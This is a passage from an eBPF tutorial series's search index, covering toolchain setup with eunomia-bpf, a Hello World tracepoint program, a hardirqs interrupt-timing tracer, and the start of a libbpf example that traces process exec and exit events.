functionalities.</p> <p>This article is the second part of the eBPF Tutorial by Example, where we will focus on how to write a simple eBPF program and demonstrate the entire development process through practical examples. Before reading this tutorial, it is recommended that you first learn the concepts of eBPF by studying the first tutorial.</p> <p>When developing eBPF programs, there are multiple development frameworks to choose from, such as BCC (BPF Compiler Collection) libbpf, cilium/ebpf, eunomia-bpf, etc. Although these tools have different characteristics, their basic development process is similar. In the following content, we will delve into these processes and use the Hello World program as an example to guide readers in mastering the basic skills of eBPF development.</p> <p>This tutorial will help you understand the basic structure of eBPF programs, the compilation and loading process, the interaction between user space and kernel space, as well as debugging and optimization techniques. By studying this tutorial, you will master the basic knowledge of eBPF development and lay a solid foundation for further learning and practice.</p>"},{"location":"tutorials/1-helloworld/#preparation-of-ebpf-development-environment-and-basic-development-process","title":"Preparation of eBPF Development Environment and Basic Development Process","text":"<p>Before starting to write eBPF programs, we need to prepare a suitable development environment and understand the basic development process of eBPF programs. This section will provide a detailed introduction to these subjects.</p>"},{"location":"tutorials/1-helloworld/#installing-the-necessary-software-and-tools","title":"Installing the necessary software and tools","text":"<p>To develop eBPF programs, you need to install the following software and tools:</p> <ul> <li>Linux kernel: Since eBPF is a kernel technology, you need to have a relatively new version of the Linux kernel (minimum version 4.8 and above, suggested version is 5.15+ or 6.2+) to support eBPF functionality.</li> <li>If possible, install a new version of Ubuntu (e.g. 23.10) would be better.</li> <li>LLVM and Clang: These tools are used to compile eBPF programs. Installing the latest version of LLVM and Clang ensures that you get the best eBPF support.</li> </ul> <p>An eBPF program consists of two main parts: the kernel space part and the user space part. The kernel space part contains the actual logic of the eBPF program, while the user space part is responsible for loading, running, and monitoring the kernel space program.</p> <p>Once you have chosen a suitable development framework, such as BCC (BPF Compiler Collection), libbpf, cilium/ebpf, or eunomia-bpf, you can begin developing the user space and kernel space programs. Taking the BCC tool as an example, we will introduce the basic development process of eBPF programs:</p> <ol> <li>Installing the BCC tool: Depending on your Linux distribution, follow the guidelines in the BCC documentation to install the BCC tool and its dependencies.</li> <li>Writing an eBPF program (C language): Use the C language to write a simple eBPF program, such as the Hello World program. This program can be executed in kernel space and perform specific tasks, such as counting network packets.</li> <li>Writing a user space program (Python or C, etc.): Use languages like Python or C to write a user space program that is responsible for loading, running, and interacting with the eBPF program. In this program, you need to use the API provided by BCC to load and manipulate the kernel space eBPF program.</li> <li>Compiling the eBPF program: Use the BCC tool to compile the eBPF program written in C language into bytecode that can be executed by the kernel. BCC dynamically compiles the eBPF program from source code at runtime.</li> <li>Loading and running the eBPF program: In the user space program, use the API provided by BCC to load the compiled eBPF program into kernel space and then run it.</li> <li>Interacting with the eBPF program: The user space program interacts with the eBPF program through the API provided by BCC, implementing data collection, analysis, and display functions. For example, you can use the BCC API to read map data in the eBPF program to obtain network packet statistics.</li> <li>Unloading the eBPF program: When the eBPF program is no longer needed, the user space program should unload it from the kernel space using the BCC API.</li> <li>Debugging and optimization: Use tools like bpftool to debug and optimize eBPF programs, improving program performance and stability.</li> </ol> <p>Through the above process, you can develop, compile, run, and debug eBPF programs using the BCC tool. Note that the development process of other frameworks, such as libbpf, cilium/ebpf, and eunomia-bpf, is similar but slightly different. Therefore, when choosing a framework, please refer to the respective official documentation and examples.</p> <p>By following this process, you can develop an eBPF program that runs in the kernel. eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain. It aims to simplify the development, building, distribution, and running of eBPF programs. It is based on the libbpf CO-RE lightweight development framework, supports loading and executing eBPF programs through a user space WebAssembly (WASM) virtual machine, and packages precompiled eBPF programs into universal JSON or WASM modules for distribution. We will use eunomia-bpf for demonstration purposes.</p>"},{"location":"tutorials/1-helloworld/#download-and-install-eunomia-bpf-development-tools","title":"Download and Install eunomia-bpf Development Tools","text":"<p>You can download and install eunomia-bpf using the following steps:</p> <p>Download the ecli tool for running eBPF programs:</p> <pre><code>$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ ./ecli -h\nUsage: ecli [--help] [--version] [--json] [--no-cache] url-and-args\n</code></pre> <p>Download the compiler toolchain for compiling eBPF kernel code into config files or WASM modules:</p> <pre><code>$ wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc &amp;&amp; chmod +x ./ecc\n$ ./ecc -h\neunomia-bpf compiler\nUsage: ecc [OPTIONS] &lt;SOURCE_PATH&gt; [EXPORT_EVENT_HEADER]\n....\n</code></pre> <p>Note: If you are on the aarch64 platform, please use the ecc-aarch64 and ecli-aarch64.</p> <p>You can also compile using the docker image:</p> <pre><code>$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # Compile using docker. `pwd` should contain *.bpf.c files and *.h files.\nexport PATH=PATH:~/.eunomia/bin\nCompiling bpf object...\nPacking ebpf object and config into /src/package.json...\n</code></pre>"},{"location":"tutorials/1-helloworld/#hello-world-minimal-ebpf-program","title":"Hello World - minimal eBPF program","text":"<p>We will start with a simple eBPF program that prints a message in the kernel. We will use the eunomia-bpf compiler toolchain to compile it into a BPF bytecode file, and then load and run the program using the ecli tool. For the sake of the example, we can temporarily disregard the user space program.</p> <pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n#define BPF_NO_GLOBAL_DATA\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\ntypedef unsigned int u32;\ntypedef int pid_t;\nconst pid_t pid_filter = 0;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"tp/syscalls/sys_enter_write\")\nint handle_tp(void *ctx)\n{\n pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n if (pid_filter &amp;&amp; pid != pid_filter)\n  return 0;\n bpf_printk(\"BPF triggered sys_enter_write from PID %d.\\n\", pid);\n return 0;\n}\n</code></pre> <p>This program defines a handle_tp function and attaches it to the sys_enter_write tracepoint using the SEC macro (i.e., it is executed when the write system call is entered). The function retrieves the process ID of the write system call invocation using the bpf_get_current_pid_tgid and bpf_printk functions, and prints it in the kernel log.</p> <ul> <li><code>bpf_trace_printk()</code>: A simple mechanism to output information to the trace_pipe (/sys/kernel/debug/tracing/trace_pipe). This is fine for simple use cases, but it has limitations: a maximum of 3 parameters; the first parameter must be %s (i.e., a string); and the trace_pipe is globally shared in the kernel, so other programs using the trace_pipe concurrently might disrupt its output. A better approach is to use BPF_PERF_OUTPUT(), which will be discussed later.</li> <li><code>void *ctx</code>: ctx is originally a parameter of a specific type, but since it is not used here, it is written as void *.</li> <li><code>return 0;</code>: This is necessary, returning 0 (to know why, refer to #139 https://github.com/iovisor/bcc/issues/139).</li> </ul> <p>To compile and run this program, you can use the ecc tool and ecli command. First, on Ubuntu/Debian, execute the following command:</p> <pre><code>sudo apt install clang llvm\n</code></pre> <p>Compile the program using ecc:</p> <pre><code>$ ./ecc minimal.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Or compile using a docker image:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Then run the compiled program using ecli:</p> <pre><code>$ sudo ./ecli run package.json\nRunning eBPF program...\n</code></pre> <p>After running this program, you can view the output of the eBPF program by checking the /sys/kernel/debug/tracing/trace_pipe file:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe | grep \"BPF triggered sys_enter_write\"\n           &lt;...&gt;-3840345 [010] d... 3220701.101143: bpf_trace_printk: write system call from PID 3840345.\n           &lt;...&gt;-3840345 [010] d... 3220701.101143: bpf_trace_printk: write system call from PID 3840345.\n</code></pre> <p>Once you stop the ecli process by pressing Ctrl+C, the corresponding output will also stop.</p> <p>Note: If your Linux distribution (e.g. Ubuntu) does not have the tracing subsystem enabled by default, you may not see any output. Use the following command to enable this feature:</p> <pre><code>$ sudo su\n# echo 1 &gt; /sys/kernel/debug/tracing/tracing_on\n</code></pre>"},{"location":"tutorials/1-helloworld/#basic-framework-of-ebpf-program","title":"Basic Framework of eBPF Program","text":"<p>As mentioned above, the basic framework of an eBPF program includes:</p> <ul> <li>Including header files: You need to include  and  header files, among others. <li>Defining a license: You need to define a license, typically using \"Dual BSD/GPL\".</li> <li>Defining a BPF function: You need to define a BPF function, for example, named handle_tp, which takes void *ctx as a parameter and returns int. This is usually written in the C language.</li> <li>Using BPF helper functions: In the BPF function, you can use BPF helper functions such as bpf_get_current_pid_tgid() and bpf_printk().</li> <li>Return value</li>"},{"location":"tutorials/1-helloworld/#tracepoints","title":"Tracepoints","text":"<p>Tracepoints are a kernel static instrumentation technique, technically just trace functions placed in the kernel source code, which are essentially probe points with control conditions inserted into the source code, allowing post-processing with additional processing functions. For example, the most common static tracing method in the kernel is printk, which outputs log messages. For example, there are tracepoints at the start and end of system calls, scheduler events, file system operations, and disk I/O. Tracepoints were first introduced in Linux version 2.6.32 in 2009. Tracepoints are a stable API and their number is limited.</p>"},{"location":"tutorials/1-helloworld/#github-templates-build-ebpf-projects-and-development-environments-easily","title":"GitHub Templates: Build eBPF Projects and Development Environments Easily","text":"<p>When faced with creating an eBPF project, are you confused about how to set up the environment and choose a programming language? Don't worry, we have prepared a series of GitHub templates to help you quickly start a brand new eBPF project. Just click the <code>Use this template</code> button on GitHub to get started.</p> <ul> <li>https://github.com/eunomia-bpf/libbpf-starter-template: eBPF project template based on the C language and libbpf framework.</li> <li>https://github.com/eunomia-bpf/cilium-ebpf-starter-template: eBPF project template based on the Go language and cilium/ebpf framework.</li> <li>https://github.com/eunomia-bpf/libbpf-rs-starter-template: eBPF project template based on the Rust language and libbpf-rs framework.</li> <li>https://github.com/eunomia-bpf/eunomia-template: eBPF project template based on the C language and eunomia-bpf framework.</li> </ul> <p>These starter templates include the following features:</p> <ul> <li>A Makefile for building the project with one command.</li> <li>A Dockerfile for automatically creating a containerized environment for your eBPF project and publishing it to Github Packages.- GitHub Actions, used for automating build, test, and release processes</li> <li>All dependencies required for eBPF development</li> </ul> <p>By setting an existing repository as a template, you and others can quickly generate new repositories with the same underlying structure, eliminating the tedious process of manual creation and configuration. With GitHub template repositories, developers can focus on the core functionality and logic of their projects without wasting time on setup and structure. For more information about template repositories, please refer to the official documentation: https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-template-repository</p>"},{"location":"tutorials/1-helloworld/#summary","title":"Summary","text":"<p>The development and usage process of eBPF programs can be summarized in the following steps:</p> <ul> <li>Define the interface and types of eBPF programs: This includes defining the interface functions of eBPF programs, defining and implementing eBPF kernel maps and shared memory (perf events), and defining and using eBPF kernel helper functions.</li> <li>Write the code for eBPF programs: This includes writing the main logic of the eBPF program, implementing read and write operations on eBPF kernel maps, and using eBPF kernel helper functions.</li> <li>Compile the eBPF program: This includes using an eBPF compiler (such as clang) to compile the eBPF program code into eBPF bytecode and generate an executable eBPF kernel module. ecc essentially calls the clang compiler to compile eBPF programs.</li> <li>Load the eBPF program into the kernel: This includes loading the compiled eBPF kernel module into the Linux kernel and attaching the eBPF program to the specified kernel events.</li> <li>Use the eBPF program: This includes monitoring the execution of the eBPF program and exchanging and sharing data using eBPF kernel maps and shared memory.</li> <li>In practical development, there may be additional steps such as configuring compilation and loading parameters, managing eBPF kernel modules and kernel maps, and using other advanced features.</li> </ul> <p>It should be noted that the execution of BPF programs occurs in the kernel space, so special tools and techniques are needed to write, compile, and debug BPF programs. eunomia-bpf is an open-source BPF compiler and toolkit that can help developers write and run BPF programs quickly and easily.</p> <p>You can also visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ or website https://eunomia.dev/tutorials/ for more examples and complete tutorials, all of which are open-source. We will continue to share more about eBPF development practices to help you better understand and master eBPF technology.</p> <p>Share on  Share on </p>"},{"location":"tutorials/10-hardirqs/","title":"eBPF Tutorial by Example 10: Capturing Interrupts with hardirqs or softirqs","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and run user-defined code at runtime in the kernel.</p> <p>This article is the tenth part of the eBPF Tutorial by Example, focusing on capturing interrupt events using hardirqs or softirqs in eBPF. hardirqs and softirqs are two different types of interrupt handlers in the Linux kernel. They are used to handle interrupt requests generated by hardware devices, as well as asynchronous events in the kernel. In eBPF, we can use the eBPF tools hardirqs and softirqs to capture and analyze information related to interrupt handling in the kernel.</p>"},{"location":"tutorials/10-hardirqs/#what-are-hardirqs-and-softirqs","title":"What are hardirqs and softirqs?","text":"<p>hardirqs are hardware interrupt handlers. When a hardware device generates an interrupt request, the kernel maps it to a specific interrupt vector and executes the associated hardware interrupt handler. Hardware interrupt handlers are commonly used to handle events in device drivers, such as completion of device data transfer or device errors.</p> <p>softirqs are software interrupt handlers. They are a low-level asynchronous event handling mechanism in the kernel, used for handling high-priority tasks in the kernel. softirqs are commonly used to handle events in the network protocol stack, disk subsystem, and other kernel components. Compared to hardware interrupt handlers, software interrupt handlers have more flexibility and configurability.</p>"},{"location":"tutorials/10-hardirqs/#implementation-details","title":"Implementation Details","text":"<p>In eBPF, we can capture and analyze hardirqs and softirqs by attaching specific kprobes or tracepoints. To capture hardirqs and softirqs, eBPF programs need to be placed on relevant kernel functions. These functions include:</p> <ul> <li>For hardirqs: irq_handler_entry and irq_handler_exit.</li> <li>For softirqs: softirq_entry and softirq_exit.</li> </ul> <p>When the kernel processes hardirqs or softirqs, these eBPF programs are executed to collect relevant information such as interrupt vectors, execution time of interrupt handlers, etc. The collected information can be used for analyzing performance issues and other interrupt handling related problems in the kernel.</p> <p>To capture hardirqs and softirqs, the following steps can be followed:</p> <ol> <li>Define data structures and maps in eBPF programs for storing interrupt information.</li> <li>Write eBPF programs and attach them to the corresponding kernel functions to capture hardirqs or softirqs.</li> <li>In eBPF programs, collect relevant information about interrupt handlers and store this information in the maps.</li> <li>In user space applications, read the data from the maps to analyze and display the interrupt handling information.</li> </ol> <p>By following the above approach, we can use hardirqs and softirqs in eBPF to capture and analyze interrupt events in the kernel, identifying potential performance issues and interrupt handling related problems.</p>"},{"location":"tutorials/10-hardirqs/#implementation-of-hardirqs-code","title":"Implementation of hardirqs Code","text":"<p>The main purpose of the hardirqs program is to obtain the name, execution count, and execution time of interrupt handlers and display the distribution of execution time in the form of a histogram. Let's analyze this code step by step.</p> <pre><code>// SPDX-License-Identifier: GPL-2.0\n// Copyright (c) 2020 Wenbo Zhang\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include \"hardirqs.h\"\n#include \"bits.bpf.h\"\n#include \"maps.bpf.h\"\n\n#define MAX_ENTRIES 256\n\nconst volatile bool filter_cg = false;\nconst volatile bool targ_dist = false;\nconst volatile bool targ_ns = false;\nconst volatile bool do_count = false;\n\nstruct {\n __uint(type, BPF_MAP_TYPE_CGROUP_ARRAY);\n __type(key, u32);\n __type(value, u32);\n __uint(max_entries, 1);\n} cgroup_map SEC(\".maps\");\n\nstruct {\n __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);\n __uint(max_entries, 1);\n __type(key, u32);\n __type(value, u64);\n} start SEC(\".maps\");\n\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, struct irq_key);\n __type(value, struct info);\n} infos SEC(\".maps\");\n\nstatic struct info zero;\n\nstatic int handle_entry(int irq, struct irqaction *action)\n{\n if (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n  return 0;\n\n if (do_count) {\n  struct irq_key key = {};\n  struct info *info;\n\n  bpf_probe_read_kernel_str(&amp;key.name, sizeof(key.name), BPF_CORE_READ(action, name));\n  info = bpf_map_lookup_or_try_init(&amp;infos, &amp;key, &amp;zero);\n  if (!info)\n   return 0;\n  info-&gt;count += 1;\n  return 0;\n } else {\n  u64 ts = bpf_ktime_get_ns();\n  u32 key = 0;\n\n  if (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n   return 0;\n\n  bpf_map_update_elem(&amp;start, &amp;key, &amp;ts, BPF_ANY);\n  return 0;\n }\n}\n\nstatic int handle_exit(int irq, struct irqaction *action)\n{\n struct irq_key ikey = {};\n struct info *info;\n u32 key = 0;\n u64 delta;\n u64 *tsp;\n\n if (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n  return 0;\n\n tsp = bpf_map_lookup_elem(&amp;start, &amp;key);\n if (!tsp)\n  return 0;\n\n delta = bpf_ktime_get_ns() - *tsp;\n if (!targ_ns)\n  delta /= 1000U;\n\n bpf_probe_read_kernel_str(&amp;ikey.name, sizeof(ikey.name), BPF_CORE_READ(action, name));\n info = bpf_map_lookup_or_try_init(&amp;infos, &amp;ikey, &amp;zero);\n if (!info)\n  return 0;\n\n if (!targ_dist) {\n  info-&gt;count += delta;\n } else {\n  u64 slot;\n\n  slot = log2(delta);\n  if (slot &gt;= MAX_SLOTS)\n   slot = MAX_SLOTS - 1;\n  info-&gt;slots[slot]++;\n }\n\n return 0;\n}\n\nSEC(\"tp_btf/irq_handler_entry\")\nint BPF_PROG(irq_handler_entry_btf, int irq, struct irqaction *action)\n{\n return handle_entry(irq, action);\n}\n\nSEC(\"tp_btf/irq_handler_exit\")\nint BPF_PROG(irq_handler_exit_btf, int irq, struct irqaction *action)\n{\n return handle_exit(irq, action);\n}\n\nSEC(\"raw_tp/irq_handler_entry\")\nint BPF_PROG(irq_handler_entry, int irq, struct irqaction *action)\n{\n return handle_entry(irq, action);\n}\n\nSEC(\"raw_tp/irq_handler_exit\")\nint BPF_PROG(irq_handler_exit, int irq, struct irqaction *action)\n{\n return handle_exit(irq, action);\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This code is an eBPF program used to capture and analyze the execution information of hardware interrupt handlers (hardirqs) in the kernel. The main purpose of the program is to obtain the name, execution count, and execution time of the interrupt handler, and display the distribution of execution time in the form of a histogram. Let's analyze this code step by step.</p> <ol> <li>Include necessary header files and define data structures:</li> </ol> <pre><code>    #include &lt;vmlinux.h&gt;\n    #include &lt;bpf/bpf_core_read.h&gt;\n    #include &lt;bpf/bpf_helpers.h&gt;\n    #include &lt;bpf/bpf_tracing.h&gt;\n    #include \"hardirqs.h\"\n    #include \"bits.bpf.h\"\n    #include \"maps.bpf.h\"\n</code></pre> <p>This program includes the standard header files required for eBPF development, as well as custom header files for defining data structures and maps.</p> <ol> <li>Define global variables and maps:</li> </ol> <pre><code>    #define MAX_ENTRIES 256\n\n    const volatile bool filter_cg = false;\n    const volatile bool targ_dist = false;\n    const volatile bool targ_ns = false;\n    const volatile bool do_count = false;\n\n    ...\n</code></pre> <p>This program defines some global variables that are used to configure the behavior of the program. For example, <code>filter_cg</code> controls whether to filter cgroups, <code>targ_dist</code> controls whether to display the distribution of execution time, etc. Additionally, the program defines three maps for storing cgroup information, start timestamps, and interrupt handler information.</p> <ol> <li>Define two helper functions <code>handle_entry</code> and <code>handle_exit</code>:</li> </ol> <p>These two functions are called at the entry and exit points of the interrupt handler. <code>handle_entry</code> records the start timestamp or updates the interrupt count, while <code>handle_exit</code> calculates the execution time of the interrupt handler and stores the result in the corresponding information map.</p> <ol> <li>Define the entry points of the eBPF program:</li> </ol> <pre><code>    SEC(\"tp_btf/irq_handler_entry\")\n    int BPF_PROG(irq_handler_entry_btf, int irq, struct irqaction *action)\n    {\n    return handle_entry(irq, action);\n    }\n\n    SEC(\"tp_btf/irq_handler_exit\")\n    int BPF_PROG(irq_handler_exit_btf, int irq, struct irqaction *action)\n    {\n    return handle_exit(irq, action);\n    }\n\n    SEC(\"raw_tp/irq_handler_entry\")\n    int BPF_PROG(irq_handler_entry, int irq, struct irqaction *action)\n    {\n    return handle_entry(irq, action);\n    }\n\n    SEC(\"raw_tp/irq_handler_exit\")\n    int BPF_PROG(irq_handler_exit, int irq, struct irqaction *action)\n    {\n    return handle_exit(irq, action);\n    }\n</code></pre> <p>Here, four entry points of the eBPF program are defined, which are used to capture the entry and exit events of the interrupt handler. <code>tp_btf</code> and <code>raw_tp</code> represent capturing events using BPF Type Format (BTF) and raw tracepoints, respectively. This ensures that the program can be ported and run on different kernel versions.</p> <p>The code for Softirq is similar, and I won't elaborate on it here.</p>"},{"location":"tutorials/10-hardirqs/#run-codetranslated-content","title":"Run code.Translated content","text":"<p>eunomia-bpf is an open-source eBPF dynamic loading runtime and development toolchain that combines Wasm. Its purpose is to simplify the development, building, distribution, and execution of eBPF programs. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the ecc compilation toolchain and ecli runtime. We use eunomia-bpf to compile and run this example.</p> <p>To compile this program, use the ecc tool:</p> <pre><code>$ ecc hardirqs.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Then run:</p> <pre><code>sudo ecli run ./package.json\n</code></pre>"},{"location":"tutorials/10-hardirqs/#summary","title":"Summary","text":"<p>In this chapter (eBPF Tutorial by Example Ten: Capturing Interrupt Events in eBPF with Hardirqs or Softirqs), we learned how to capture and analyze the execution information of hardware interrupt handlers (hardirqs) in the kernel using eBPF programs. We explained the example code in detail, including how to define data structures, mappings, eBPF program entry points, and how to call helper functions to record execution information at the entry and exit points of interrupt handlers.</p> <p>By studying the content of this chapter, you should have mastered the methods of capturing interrupt events with hardirqs or softirqs in eBPF, as well as how to analyze these events to identify performance issues and other problems related to interrupt handling in the kernel. These skills are crucial for analyzing and optimizing the performance of the Linux kernel.</p> <p>To better understand and practice eBPF programming, we recommend reading the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf. In addition, we provide a complete tutorial and source code for you to view and learn from at https://github.com/eunomia-bpf/bpf-developer-tutorial.</p> <p>The original link of this article: https://eunomia.dev/tutorials/10-hardirqs/</p> <p>Share on  Share on </p>"},{"location":"tutorials/11-bootstrap/","title":"eBPF Tutorial by Example 11: Develop User-Space Programs with libbpf and Trace exec() and exit()","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and run user-defined code during kernel runtime.</p> <p>In this tutorial, we will learn how kernel-space and user-space eBPF programs work together. We will also learn how to use the native libbpf to develop user-space programs, package eBPF applications into executable files, and distribute them across different kernel versions.</p>"},{"location":"tutorials/11-bootstrap/#the-libbpf-library-and-why-we-need-to-use-it","title":"The libbpf Library and Why We Need to Use It","text":"<p>libbpf is a C language library that is distributed with the kernel version to assist in loading and running eBPF programs. It provides a set of C APIs for interacting with the eBPF system, allowing developers to write user-space programs more easily to load and manage eBPF programs. These user-space programs are typically used for system performance analysis, monitoring, or optimization.</p> <p>There are several advantages to using the libbpf library:</p> <ul> <li>It simplifies the process of loading, updating, and running eBPF programs.</li> <li>It provides a set of easy-to-use APIs, allowing developers to focus on writing core logic instead of dealing with low-level details.</li> <li>It ensures compatibility with the eBPF subsystem in the kernel, reducing maintenance costs.</li> </ul> <p>At the same time, libbpf and BTF (BPF Type Format) are important components of the eBPF ecosystem. They play critical roles in achieving compatibility across different kernel versions. BTF is a metadata format used to describe type information in eBPF programs. The primary purpose of BTF is to provide a structured way to describe data structures in the kernel so that eBPF programs can access and manipulate them more easily.</p> <p>The key roles of BTF in achieving compatibility across different kernel versions are as follows:</p> <ul> <li>BTF allows eBPF programs to access detailed type information of kernel data structures without hardcoding specific kernel versions. This enables eBPF programs to adapt to different kernel versions, achieving compatibility across kernel versions.</li> <li>By using BPF CO-RE (Compile Once, Run Everywhere) technology, eBPF programs can leverage BTF to parse the type information of kernel data structures during compilation, thereby generating eBPF programs that can run on different kernel versions.</li> </ul> <p>By combining libbpf and BTF, eBPF programs can run on various kernel versions without the need for separate compilation for each kernel version. This greatly improves the portability and compatibility of the eBPF ecosystem and reduces the difficulty of development and maintenance.</p>"},{"location":"tutorials/11-bootstrap/#what-is-bootstrap","title":"What is Bootstrap","text":"<p>Bootstrap is a complete application that utilizes libbpf. It uses eBPF programs to trace the exec() system call in the kernel (handled by the SEC(\"tp/sched/sched_process_exec\") handle_exec BPF program), which mainly corresponds to the creation of new processes (excluding the fork() part). In addition, it also traces the exit() system call of processes (handled by the SEC(\"tp/sched/sched_process_exit\") handle_exit BPF program) to understand when each process exits.</p> <p>These two BPF programs work together to capture interesting information about new processes, such as the file name of the binary and measure the lifecycle of processes. They also collect interesting statistics, such as exit codes or resource consumption, when a process exits. This is a good starting point to gain a deeper understanding of the inner workings of the kernel and observe how things actually operate.</p> <p>Bootstrap also uses the argp API (part of libc) for command-line argument parsing, allowing users to configure the behavior of the application through command-line options. This provides flexibility and allows users to customize the program behavior according to their specific needs. While these functionalities can also be achieved using the eunomia-bpf tool, using libbpf here provides higher scalability in user space at the cost of additional complexity.</p>"},{"location":"tutorials/11-bootstrap/#bootstrap","title":"Bootstrap","text":"<p>Bootstrap consists of two parts: kernel space and user space. The kernel space part is an eBPF program that traces the exec() and exit() system calls. The user space part is a C language program that uses the libbpf library to load and run the kernel space program and process the data collected from the kernel space program.</p>"},{"location":"tutorials/11-bootstrap/#kernel-space-ebpf-program-bootstrapbpfc","title":"Kernel-space eBPF Program bootstrap.bpf.c","text":"<pre><code>// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause\n/* Copyright (c) 2020 Facebook */\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"bootstrap.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nconst volatile unsigned long long min_duration_ns = 0;\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    struct task_struct *task;\n    unsigned fname_off;\n    struct event *e;\n    pid_t pid;\n    u64 ts;\n\n    /* remember time exec() was executed for this PID */\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    ts = bpf_ktime_get_ns();\n    bpf_map_update_elem(&amp;exec_start, &amp;pid, &amp;ts, BPF_ANY);\n\n    /* don't emit exec events when minimum duration is specified */\n    if (min_duration_ns)\n        return 0;\n\n    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    /* fill out the sample with data */\n    task = (struct task_struct *)bpf_get_current_task();\n\n    e-&gt;exit_event = false;\n    e-&gt;pid = pid;\n    e-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\n    bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n    fname_off = ctx-&gt;__data_loc_filename &amp; 0xFFFF;\n    bpf_probe_read_str(&amp;e-&gt;filename, sizeof(e-&gt;filename), (void *)ctx + fname_off);\n\n    /* successfully submit it to user-space for post-processing */\n    bpf_ringbuf_submit(e, 0);\n    return 0;\n}\n\nSEC(\"tp/sched/sched_process_exit\")\nint handle_exit(struct trace_event_raw_sched_process_template* ctx)\n{\n    struct task_struct *task;\n    struct event *e;\n    pid_t pid, tid;\n    u64 id, ts, *start_ts, duration_ns = 0;\n\n    /* get PID and TID of exiting thread/process */\n    id = bpf_get_current_pid_tgid();\n    pid = id &gt;&gt; 32;\n    tid = (u32)id;\n\n    /* ignore thread exits */\n    if (pid != tid)\n        return 0;\n\n    /* if we recorded start of the process, calculate lifetime duration */\n    start_ts = bpf_map_lookup_elem(&amp;exec_start, &amp;pid);\n    if (start_ts)duration_ns = bpf_ktime_get_ns() - *start_ts;\n    else if (min_duration_ns)\n        return 0;\n    bpf_map_delete_elem(&amp;exec_start, &amp;pid);\n\n    /* if process didn't live long enough, return early */\n    if (min_duration_ns &amp;&amp; duration_ns &lt; min_duration_ns)\n        return 0;\n\n    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    /* fill out the sample with data */\n    task = (struct task_struct *)bpf_get_current_task();\n\n    e-&gt;exit_event = true;\n    e-&gt;duration_ns = duration_ns;\n    e-&gt;pid = pid;\n    e-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\n    e-&gt;exit_code = (BPF_CORE_READ(task, exit_code) &gt;&gt; 8) &amp; 0xff;\n    bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n    /* send data to user-space for post-processing */\n    bpf_ringbuf_submit(e, 0);\n    return 0;\n}\n</code></pre> <p>This code is a kernel-level eBPF program (<code>bootstrap.bpf.c</code>) used to trace <code>exec()</code> and <code>exit()</code> system calls. It captures process creation and exit events using an eBPF program and sends the relevant information to a user-space program for processing. Below is a detailed explanation of the code.</p> <p>First, we include the necessary headers and define the license for the eBPF program. We also define two eBPF maps: <code>exec_start</code> and <code>rb</code>. <code>exec_start</code> is a hash type eBPF map used to store the timestamp when a process starts executing. <code>rb</code> is a ring buffer type eBPF map used to store captured event data and send it to the user-space program.</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"bootstrap.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct 